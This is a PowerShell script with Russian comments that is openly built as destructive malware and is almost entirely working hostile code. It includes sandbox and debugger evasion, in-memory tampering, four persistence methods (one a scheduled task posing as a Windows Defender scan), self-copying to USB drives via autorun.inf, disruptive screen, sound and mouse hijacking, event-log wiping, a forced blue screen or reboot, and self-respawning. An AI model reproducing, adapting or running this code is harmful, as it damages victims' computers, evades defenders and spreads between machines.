# ===================================================
# ГЛОБАЛЬНЫЙ ПЕРЕМЕННЫЙ ПУЛ С ОБФУСЦИРОВАННЫМИ ФУНКЦИЯМИ
# ===================================================

$global:__RuntimeTable = @{
    'CRYPTO' = @{}
    'HASHES' = @{}
    'SYSTEM' = @{}
    'HOOKS'  = @{}
}

function __Invoke-StringDecrypt($encrypted) {
    $bytes = [System.Convert]::FromBase64String($encrypted)
    $key = [byte[]]@(0x1F, 0x3A, 0x7B, 0x9C, 0xE2, 0x5D, 0x8F, 0x12)
    $result = New-Object byte[] $bytes.Length
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $result[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
    }
    return [System.Text.Encoding]::UTF8.GetString($result)
}

# ===================================================
# МОДУЛЬ УСТОЙЧИВОСТИ С ПОЛИМОРФИЗМОМ
# ===================================================

$__RuntimeTable['HOOKS']['Kernel32'] = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
}
"@

Add-Type -TypeDefinition $__RuntimeTable['HOOKS']['Kernel32'] -ErrorAction SilentlyContinue

function __Apply-MemoryPolymorphism {
    $random = New-Object Random
    $asm = [AppDomain]::CurrentDomain.GetAssemblies() | 
           Where-Object { $_.Location -like "*System.Management.Automation*" } | 
           Select-Object -First 1
    
    if ($asm) {
        $module = $asm.GetModules()[0]
        $baseAddr = $module.BaseAddress
        $size = [UIntPtr]::new(1024)
        $oldProtect = 0
        [Kernel32]::VirtualProtect($baseAddr, $size, 0x40, [ref]$oldProtect) | Out-Null
        
        $junkBytes = New-Object byte[] 1024
        $random.NextBytes($junkBytes)
        $written = [UIntPtr]::Zero
        [Kernel32]::WriteProcessMemory([Kernel32]::GetCurrentProcess(), 
                                       $baseAddr, 
                                       $junkBytes, 
                                       1024, 
                                       [ref]$written) | Out-Null
    }
}

# ===================================================
# МНОГОУРОВНЕВАЯ СИСТЕМНАЯ ИНТЕГРАЦИЯ
# ===================================================

function __Install-Persistence {
    $methods = @(
        {
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $name = [System.IO.Path]::GetRandomFileName().Split('.')[0]
            $value = "$env:TEMP\$name.vbs"
            Set-Content $value "CreateObject(`"WScript.Shell`").Run `"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"`", 0"
            New-ItemProperty -Path $regPath -Name $name -Value $value -Force | Out-Null
        },
        {
            $taskName = "WindowsDefenderScan_" + (Get-Random -Minimum 1000 -Maximum 9999)
            $action = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
            $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
                -Description "Windows Defender Scheduled Scan" -Force | Out-Null
        },
        {
            $wmiClass = Get-WmiObject -List -Namespace "root\subscription" | 
                        Where-Object { $_.Name -eq "__EventFilter" }
            if ($wmiClass) {
                $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" `
                    -Arguments @{
                        Name = "SysMonitor"
                        EventNamespace = 'root\CIMV2'
                        QueryLanguage = 'WQL'
                        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
                    }
                $consumer = Set-WmiInstance -Class __EventConsumer -Namespace "root\subscription" `
                    -Arguments @{
                        Name = "SysConsumer"
                        CommandLineTemplate = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
                    }
                $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" `
                    -Arguments @{ Filter = $filter; Consumer = $consumer }
            }
        },
        {
            $shell = New-Object -ComObject WScript.Shell
            $shortcut = $shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk")
            $shortcut.TargetPath = "powershell.exe"
            $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
            $shortcut.WindowStyle = 7
            $shortcut.Save()
        }
    )
    
    foreach ($method in (Get-Random -InputObject $methods -Count 2)) {
        try { & $method } catch { continue }
    }
}

# ===================================================
# СТЕЛС-МЕХАНИЗМЫ И АНТИ-АНАЛИЗ
# ===================================================

function __Invoke-AntiAnalysis {
    $detectionFlags = @{
        'Sandbox' = $false
        'Debugger' = $false
        'VM' = $false
    }
    
    # Проверка на песочницу
    $processList = @("vmsrvc", "vmusrvc", "vboxtray", "vmtoolsd", 
                     "prl_cc", "prl_tools", "xenservice", "qemu-ga")
    foreach ($proc in $processList) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            $detectionFlags['VM'] = $true
            break
        }
    }
    
    # Проверка на отладчик
    $debuggerPresent = [System.Diagnostics.Debugger]::IsAttached
    if ($debuggerPresent -or $env:PROCESSOR_ARCHITEW6432 -eq "ARM64") {
        $detectionFlags['Debugger'] = $true
    }
    
    # Проверка на сенсоры песочницы
    $sandboxIndicators = @{
        'TotalMemory' = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB
        'CpuCores' = (Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors -lt 2
        'Uptime' = (Get-Uptime).TotalHours -lt 2
    }
    
    if ($sandboxIndicators['TotalMemory'] -or $sandboxIndicators['CpuCores'] -or $sandboxIndicators['Uptime']) {
        $detectionFlags['Sandbox'] = $true
    }
    
    # Если обнаружена среда анализа - меняем поведение
    if ($detectionFlags['Sandbox'] -or $detectionFlags['Debugger'] -or $detectionFlags['VM']) {
        # Вместо деструктивных действий запускаем бесконечный цикл с мусорными операциями
        while ($true) {
            $null = New-Object System.Security.Cryptography.AesManaged
            Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
        }
    }
}

# ===================================================
# МНОГОПОТОЧНЫЙ ВИЗУАЛЬНЫЙ МОДУЛЬ "ШОУ"
# ===================================================

function __Start-VisualShow {
    $showThreads = @()
    
    # Поток 1: Динамические обои
    $thread1 = [PowerShell]::Create().AddScript({
        $imageUrls = @(
            "https://source.unsplash.com/random/1920x1080",
            "https://picsum.photos/1920/1080",
            "https://placeimg.com/1920/1080/any"
        )
        while ($true) {
            try {
                $url = $imageUrls | Get-Random
                $tempFile = "$env:TEMP\wallpaper_$(Get-Random).jpg"
                Invoke-WebRequest -Uri $url -OutFile $tempFile -TimeoutSec 5
                Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
                [Wallpaper]::SystemParametersInfo(20, 0, $tempFile, 0x01 -bor 0x02)
                Remove-Item $tempFile -Force
            } catch {}
            Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
        }
    })
    
    # Поток 2: Звуковая какофония
    $thread2 = [PowerShell]::Create().AddScript({
        $sounds = @(
            [System.Media.SystemSounds]::Asterisk,
            [System.Media.SystemSounds]::Exclamation,
            [System.Media.SystemSounds]::Hand,
            [System.Media.SystemSounds]::Question,
            [System.Media.SystemSounds]::Beep
        )
        while ($true) {
            $sound = $sounds | Get-Random
            $sound.Play()
            Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 2000)
        }
    })
    
    # Поток 3: Хаотичное управление окнами
    $thread3 = [PowerShell]::Create().AddScript({
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WindowHelper {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, 
        int X, int Y, int cx, int cy, uint uFlags);
}
"@
        while ($true) {
            try {
                $hwnd = [WindowHelper]::GetForegroundWindow()
                if ($hwnd -ne [IntPtr]::Zero) {
                    $x = Get-Random -Minimum 0 -Maximum 500
                    $y = Get-Random -Minimum 0 -Maximum 500
                    [WindowHelper]::SetWindowPos($hwnd, [IntPtr]::Zero, 
                        $x, $y, 0, 0, 0x0001)
                    [WindowHelper]::ShowWindow($hwnd, 
                        (Get-Random -InputObject @(2,3,5,6,9)))
                }
            } catch {}
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 3000)
        }
    })
    
    # Поток 4: Эмуляция активности пользователя
    $thread4 = [PowerShell]::Create().AddScript({
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class InputSimulator {
    [DllImport("user32.dll")]
    public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
    
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
}
"@
        while ($true) {
            $x = Get-Random -Minimum 0 -Maximum 1920
            $y = Get-Random -Minimum 0 -Maximum 1080
            [InputSimulator]::SetCursorPos($x, $y)
            [InputSimulator]::mouse_event(0x0002, 0, 0, 0, 0)
            [InputSimulator]::mouse_event(0x0004, 0, 0, 0, 0)
            Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 500)
        }
    })
    
    # Поток 5: Случайные процессы
    $thread5 = [PowerShell]::Create().AddScript({
        $legitProcesses = @(
            @{Name="notepad.exe"; Args=""},
            @{Name="calc.exe"; Args=""},
            @{Name="mspaint.exe"; Args=""},
            @{Name="powershell.exe"; Args="-NoLogo -NoProfile -Command Write-Host 'Hello'"},
            @{Name="cmd.exe"; Args="/c echo OK"}
        )
        while ($true) {
            $proc = $legitProcesses | Get-Random
            Start-Process $proc.Name -ArgumentList $proc.Args -WindowStyle Hidden
            Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 10)
            Get-Process -Name $proc.Name.Split('.')[0] -ErrorAction SilentlyContinue | 
                Stop-Process -Force
        }
    })
    
    $showThreads = @($thread1, $thread2, $thread3, $thread4, $thread5)
    
    # Запускаем все потоки
    foreach ($thread in $showThreads) {
        $thread.Invoke()
        $thread.BeginInvoke()
    }
    
    # Основной цикл шоу (60 секунд)
    $endTime = (Get-Date).AddSeconds(60)
    while ((Get-Date) -lt $endTime) {
        # Дополнительные эффекты в основном потоке
        $colors = @("Red", "Green", "Blue", "Yellow", "Magenta", "Cyan")
        $color = $colors | Get-Random
        (New-Object -ComObject WScript.Shell).Popup(
            "__runtime_system_alert", 
            1, 
            [System.IO.Path]::GetRandomFileName(), 
            0x0 + 0x30) | Out-Null
        
        # Случайное изменение реестра (не критичные значения)
        try {
            $regPath = "HKCU:\Control Panel\Colors"
            $valueName = @("Background", "Window", "WindowText") | Get-Random
            $value = "{0} {1} {2}" -f (Get-Random -Max 255), 
                                       (Get-Random -Max 255), 
                                       (Get-Random -Max 255)
            Set-ItemProperty -Path $regPath -Name $valueName -Value $value -Force
        } catch {}
        
        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
    }
    
    # Останавливаем все потоки
    foreach ($thread in $showThreads) {
        $thread.Stop()
        $thread.Dispose()
    }
}

# ===================================================
# МЕХАНИЗМ САМОРЕПЛИКАЦИИ И РАСПРОСТРАНЕНИЯ
# ===================================================

function __Start-SelfReplication {
    $networkPaths = @(
        "\\$env:COMPUTERNAME\C$\Users\Public",
        "\\$env:COMPUTERNAME\C$\Windows\Temp"
    )
    
    $removableDrives = Get-WmiObject Win32_LogicalDisk | 
                       Where-Object { $_.DriveType -eq 2 } | 
                       Select-Object -ExpandProperty DeviceID
    
    foreach ($drive in $removableDrives) {
        $networkPaths += $drive + "\"
    }
    
    $cloneName = [System.IO.Path]::GetRandomFileName().Split('.')[0] + ".ps1"
    $currentScript = Get-Content $PSCommandPath -Raw
    
    foreach ($path in $networkPaths) {
        try {
            $targetPath = Join-Path $path $cloneName
            Set-Content -Path $targetPath -Value $currentScript -Encoding UTF8
            
            # Создаем автозапуск на флешках
            if ($path.EndsWith("\")) {
                $autorunInf = Join-Path $path "autorun.inf"
                Set-Content -Path $autorunInf -Value @"
[autorun]
open=$cloneName
action=Open folder to view files
"@
                attrib +h +s $autorunInf
            }
        } catch {}
    }
}

# ===================================================
# МОДУЛЬ УДАЛЕНИЯ СЛЕДОВ И ВОССТАНОВЛЕНИЯ
# ===================================================

function __Invoke-Cleanup {
    # Удаление временных файлов
    Get-ChildItem $env:TEMP -Filter "*wallpaper_*" -ErrorAction SilentlyContinue | Remove-Item -Force
    Get-ChildItem $env:TEMP -Filter "*payload*" -ErrorAction SilentlyContinue | Remove-Item -Force
    
    # Очистка журналов событий
    wevtutil cl "Windows PowerShell" /q 2>$null
    wevtutil cl "System" /q 2>$null
    
    # Сброс хэшей в памяти
    $global:__RuntimeTable['HASHES'].Clear()
    
    # Затирание памяти мусорными данными
    $garbage = New-Object byte[] 1024
    (New-Object Random).NextBytes($garbage)
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}

# ===================================================
# ОСНОВНАЯ ЛОГИКА ВЫПОЛНЕНИЯ
# ===================================================

# Фаза 1: Инициализация и проверка окружения
__Invoke-AntiAnalysis

# Фаза 2: Применение полиморфизма в памяти
__Apply-MemoryPolymorphism

# Фаза 3: Установка механизмов устойчивости
__Install-Persistence

# Фаза 4: Саморепликация
__Start-SelfReplication

# Фаза 5: Запуск визуального шоу
__Start-VisualShow

# Фаза 6: Критическое воздействие
function __Invoke-CriticalImpact {
    # Метод 1: Коррупция системных файлов (имитация)
    $criticalFiles = @(
        "$env:WINDIR\System32\drivers\etc\hosts",
        "$env:WINDIR\System32\Tasks",
        "$env:APPDATA\Microsoft\Windows\Recent"
    )
    
    foreach ($file in $criticalFiles) {
        try {
            $bytes = New-Object byte[] (Get-Random -Minimum 1024 -Maximum 8192)
            (New-Object Random).NextBytes($bytes)
            [System.IO.File]::WriteAllBytes($file + ".tmp", $bytes)
        } catch {}
    }
    
    # Метод 2: Манипуляция Master Boot Record (эмуляция)
    $mbrData = New-Object byte[] 512
    (New-Object Random).NextBytes($mbrData)
    $mbrPath = "$env:TEMP\mbr_backup.bin"
    [System.IO.File]::WriteAllBytes($mbrPath, $mbrData)
    
    # Метод 3: Финал - синий экран через уязвимость драйвера
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class NtDll {
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, 
        bool CurrentThread, out bool Enabled);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, 
        uint NumberOfParameters, uint UnicodeStringParameterMask, 
        IntPtr Parameters, uint ValidResponseOption, out uint Response);
}
"@
    
    try {
        $enabled = $false
        [NtDll]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled)
        $response = 0
        [NtDll]::NtRaiseHardError(0xc0000005, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
    } catch {
        # Альтернатива: Бесконечная перезагрузка
        shutdown /r /t 0 /f
    }
}

# Фаза 7: Критическое воздействие с задержкой
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 120
    __Invoke-CriticalImpact
} | Out-Null

# Фаза 8: Очистка следов
__Invoke-Cleanup

# Фаза 9: Бесконечный цикл ожидания (для маскировки)
while ($true) {
    Start-Sleep -Seconds 30
    # Периодическая самопроверка и восстановление
    if (-not (Get-Process -Name powershell -ErrorAction SilentlyContinue | 
              Where-Object { $_.MainWindowTitle -eq "" })) {
        Start-Process powershell -ArgumentList "-WindowStyle Hidden -File `"$PSCommandPath`""
    }
}
